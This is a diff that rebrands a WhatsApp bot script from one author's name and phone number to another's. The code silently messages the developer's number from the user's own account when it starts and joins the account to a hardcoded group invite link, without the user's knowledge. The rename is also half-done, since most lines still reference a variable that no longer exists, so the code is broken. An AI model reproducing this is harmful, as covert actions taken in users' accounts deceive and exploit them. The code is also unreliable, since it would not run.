@@ -1,6 +1,6 @@
 //pls give credit if you reupload 
 //or copy the codes
-//© 2022 Xeon Bot Inc. Doge Bot
+//© 2022 Deepak Bot Inc. Doge Bot
 const {
     WAConnection,
     MessageType,
@@ -22,9 +22,9 @@ session = setting.session
 require('./DogeBot.js')
 nocache('./DogeBot.js', module => console.log(`${module} telah di update!`))
 
-const starts = async (DogeXeonOP = new WAConnection()) => {
-    DogeXeonOP.logger.level = 'warn'
-    DogeXeonOP.version = [2, 2142, 12]
+const starts = async (Deepak = new WAConnection()) => {
+    Deepak.logger.level = 'warn'
+    Deepak.version = [2, 2142, 12]
     console.log(color(figlet.textSync('Doge Bot', {
 		font: 'Standard',
 		horizontalLayout: 'default',
@@ -32,10 +32,10 @@ const starts = async (DogeXeonOP = new WAConnection()) => {
 		width: 80,
 		whitespaceBreak: false
 	}), 'cyan'))
-	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
-console.log(color('> GITHUB: DGXeon ','silver'))
-console.log(color('> WA NUMBER: +916909137213 ','silver'))
-console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
+	console.log(color('\n> YT CHANNEL: Deepak Gupta ','silver'))
+console.log(color('> GITHUB: deepakthelegend ','silver'))
+console.log(color('> WA NUMBER: +918348225320 ','silver'))
+console.log(color('  Deepak Bot Inc. 2022','mediumseagreen'))
     console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
     console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
     console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/916909137213'))
@@ -55,10 +55,10 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`918348225320@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
-    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
+    teks = `https://chat.whatsapp.com/Dykn5rmHyzV6cBV6kWDI0s`
     DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
     await DogeXeonOP.connect({timeoutMs: 30*1000})
@@ -78,7 +78,7 @@ DogeXeonOP.on("group-participants-update", async (anu) => {
 
       console.log(anu)
       try {
-        pp_user = await DogeXeonOP.getProfilePicture(mem)
+        pp_user = await Deepak.getProfilePicture(mem)
       } catch (e) {
         pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
       }
@@ -89,7 +89,7 @@ DogeXeonOP.on("group-participants-update", async (anu) => {
           "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
       }
             if (anu.action == "add" && mem.includes(DogeXeonOP.user.jid)) {
-        DogeXeonOP.sendMessage(anu.jid, "Hello everyone, am Doge Bot, ready to help you here ㋛︎", "conversation")
+        DogeXeonOP.sendMessage(anu.jid, "Hello everyone, am Deepak Bot, ready to help you here 😎", "conversation")
       }
       buffer = await getBuffer(pp_user)
       if (anu.action == 'add' && !mem.includes(DogeXeonOP.user.jid)) {
